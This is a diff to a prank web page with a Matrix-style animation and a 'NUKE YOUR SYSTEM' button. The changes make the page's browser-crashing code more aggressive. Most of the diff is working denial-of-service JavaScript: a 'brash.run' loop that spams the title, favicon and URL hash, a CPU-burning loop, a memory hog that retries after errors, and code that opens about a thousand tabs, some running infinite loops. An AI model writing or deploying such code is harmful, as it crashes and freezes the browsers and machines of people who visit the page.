@@ -11,18 +11,27 @@
             background: black;
             color: green;
             font-family: monospace;
+            user-select: none;
         }
         canvas {
             display: block;
         }
-        #logo {
+        #logo-container {
             position: absolute;
+            pointer-events: none;
+            cursor: default;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: all 0.5s ease;
+        }
+        #logo {
             pointer-events: auto;
             cursor: pointer;
-            user-select: none;
             image-rendering: pixelated;
             width: 220px;
-            z-index: 10;
+            margin-bottom: 20px;
         }
         #crash-overlay {
             position: fixed;
@@ -75,7 +84,7 @@
             border: 2px solid #fff;
             border-radius: 8px;
             cursor: pointer;
-            transition: background 0.3s, transform 0.3s;
+            transition: all 0.3s;
             pointer-events: auto;
             z-index: 10000;
             display: none;
@@ -83,20 +92,36 @@
         #nuke-button:hover {
             background: #ff0000;
             transform: scale(1.1);
+            box-shadow: 0 0 20px #ff0000;
+        }
+        .warning {
+            font-size: 24px;
+            color: yellow;
+            text-shadow: 0 0 10px #ff0;
+            margin-top: 20px;
+            animation: pulse 1s infinite alternate;
+        }
+        @keyframes pulse {
+            from { opacity: 0.7; }
+            to { opacity: 1; }
         }
     </style>
 </head>
 <body>
     <canvas id="matrixCanvas"></canvas>
-    <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png">
+    <div id="logo-container">
+        <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png">
+        <button id="nuke-button">NUKE YOUR SYSTEM</button>
+    </div>
 
     <div id="crash-overlay">
         <img id="crash-gif" src="https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif" alt="NUCLEAR">
-        bye bye ram … and cpu
-        <button id="nuke-button">nuke ?</button>
+        <div>PREPARING SYSTEM DESTRUCTION...</div>
+        <div class="warning">WARNING: THIS WILL CRASH YOUR BROWSER</div>
     </div>
 
     <script>
+        // Matrix effect
         const canvas = document.getElementById("matrixCanvas");
         const ctx = canvas.getContext("2d");
         canvas.width = window.innerWidth;
@@ -128,7 +153,9 @@
 
         setInterval(drawMatrix, 50);
 
+        // Moving logo
         const logo = document.getElementById("logo");
+        const logoContainer = document.getElementById("logo-container");
         const overlay = document.getElementById("crash-overlay");
         const nukeButton = document.getElementById("nuke-button");
 
@@ -152,99 +179,163 @@
                 y = Math.max(0, Math.min(y, window.innerHeight - h));
             }
 
-            logo.style.left = `${x}px`;
-            logo.style.top = `${y}px`;
+            logoContainer.style.left = `${x}px`;
+            logoContainer.style.top = `${y}px`;
 
             requestAnimationFrame(updateLogo);
         }
 
         requestAnimationFrame(updateLogo);
 
+        // Prepare title strings for brash.run exploit
         const titleStrings = [];
-        for (let i = 0; i < 250; i++) {
+        for (let i = 0; i < 500; i++) {
             let str = '';
-            for (let j = 0; j < 1024; j++) {
+            for (let j = 0; j < 2048; j++) {
                 str += Math.random().toString(36)[2] || 'x';
             }
             titleStrings.push(str);
         }
 
+        // Aggressive brash.run exploit
         function startBrashExploit() {
             let counter = 0;
             function spamLoop() {
-                for (let burst = 0; burst < 200; burst++) {
-                    document.title = titleStrings[counter % titleStrings.length] + " 💀" + counter;
-                    counter++;
-                }
+                // Change title rapidly
+                document.title = titleStrings[counter % titleStrings.length] + " 💀" + counter;
+
+                // Change favicon rapidly
+                const favicon = document.querySelector("link[rel*='icon']") || document.createElement('link');
+                favicon.type = 'image/x-icon';
+                favicon.rel = 'shortcut icon';
+                favicon.href = `data:image/x-icon;base64,${btoa(Math.random().toString())}`;
+                document.getElementsByTagName('head')[0].appendChild(favicon);
+
+                // Change URL hash
+                window.location.hash = Math.random().toString(36).substring(2);
+
+                counter++;
+
                 if (counter < 10000000) {
-                    requestAnimationFrame(spamLoop);
+                    setTimeout(spamLoop, 0);
                 }
             }
             spamLoop();
         }
 
+        // Infinite loop crasher
         function startInfiniteLoop() {
-            while (true) {
-                Math.random();
-                Date.now();
+            const startTime = Date.now();
+            function crashLoop() {
+                // Perform heavy computations
+                for (let i = 0; i < 1000000; i++) {
+                    Math.sqrt(Math.random() * Date.now());
+                }
+
+                // Recursive call
+                if (Date.now() - startTime < 30000) { // Run for 30 seconds
+                    setTimeout(crashLoop, 0);
+                }
             }
+            crashLoop();
         }
 
+        // Memory hog
+        function startMemoryHog() {
+            const memoryHog = [];
+            function hogMemory() {
+                try {
+                    memoryHog.push(new Array(1000000).fill(Math.random()));
+                    setTimeout(hogMemory, 10);
+                } catch (e) {
+                    // Try again if we hit memory limit
+                    setTimeout(hogMemory, 100);
+                }
+            }
+            hogMemory();
+        }
+
+        // Open 1000 tabs
         function openSpamTabs() {
-            for (let i = 0; i < 1000; i++) {
-                window.open('about:blank', '_blank');
+            // First try with about:blank
+            for (let i = 0; i < 50; i++) {
+                try {
+                    window.open('about:blank', '_blank');
+                } catch (e) {}
+            }
+
+            // Then try with data URLs
+            for (let i = 0; i < 50; i++) {
+                try {
+                    window.open('data:text/html,<script>while(true){Math.random()}</script>', '_blank');
+                } catch (e) {}
+            }
+
+            // Then try with the current page
+            for (let i = 0; i < 900; i++) {
+                try {
+                    window.open(window.location.href, '_blank');
+                } catch (e) {}
             }
         }
 
+        // Trigger all exploits
         function triggerCrash() {
-            let flashCount = 0;
-            const maxFlashes = 60;
-            const flashIntervalMs = 750;
+            // Show overlay
+            overlay.style.opacity = "1";
 
+            // Disable the button
+            nukeButton.style.display = "none";
+            nukeButton.disabled = true;
+
+            // Start visual feedback
+            let dots = 0;
+            const overlayText = overlay.querySelector('div:first-of-type');
             const interval = setInterval(() => {
-                if (flashCount % 2 === 0) {
-                    overlay.style.background = "red";
-                } else {
-                    overlay.style.background = "white";
-                }
-                overlay.style.opacity = "1";
+                dots = (dots + 1) % 4;
+                overlayText.textContent = "PREPARING SYSTEM DESTRUCTION" + ".".repeat(dots);
+            }, 500);
 
-                flashCount++;
+            // Start all exploits after a delay
+            setTimeout(() => {
+                clearInterval(interval);
+                overlayText.textContent = "DESTROYING SYSTEM...";
 
-                if (flashCount >= maxFlashes) {
-                    clearInterval(interval);
-                    overlay.style.background = "red";
-                    overlay.style.opacity = "0.96";
+                // Start all exploits simultaneously
+                startBrashExploit();
+                startInfiniteLoop();
+                startMemoryHog();
+                openSpamTabs();
 
-                    setTimeout(() => {
-                        try {
-                            let memHog = [];
-                            while (true) {
-                                memHog.push(new Array(1000000).fill(Math.random() * 999999));
-                            }
-                        } catch (e) {}
-                    }, 300);
-
-                    setTimeout(() => {
-                        startBrashExploit();
-                        startInfiniteLoop();
-                        openSpamTabs();
-                    }, 800);
-                }
-            }, flashIntervalMs);
+                // Additional visual feedback
+                setInterval(() => {
+                    document.body.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+                }, 100);
+            }, 3000);
         }
 
+        // Logo click handler
         logo.addEventListener("click", () => {
-            overlay.style.opacity = "1";
+            // Move button under the logo
             nukeButton.style.display = "block";
-            document.getElementById("crash-gif").style.animation = "explode 1.5s ease-in-out 1";
+            nukeButton.style.position = "static";
+            nukeButton.style.marginTop = "10px";
+
+            // Make logo stop moving
+            logo.style.cursor = "default";
+            logo.style.pointerEvents = "none";
+
+            // Show warning
+            overlay.style.opacity = "0.8";
+            setTimeout(() => {
+                overlay.style.opacity = "0";
+            }, 2000);
         });
 
-        nukeButton.addEventListener("click", () => {
-            nukeButton.style.display = "none";
-            triggerCrash();
-        });
+        // Nuke button click handler
+        nukeButton.addEventListener("click", triggerCrash);
 
+        // Window resize handler
         window.addEventListener("resize", () => {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
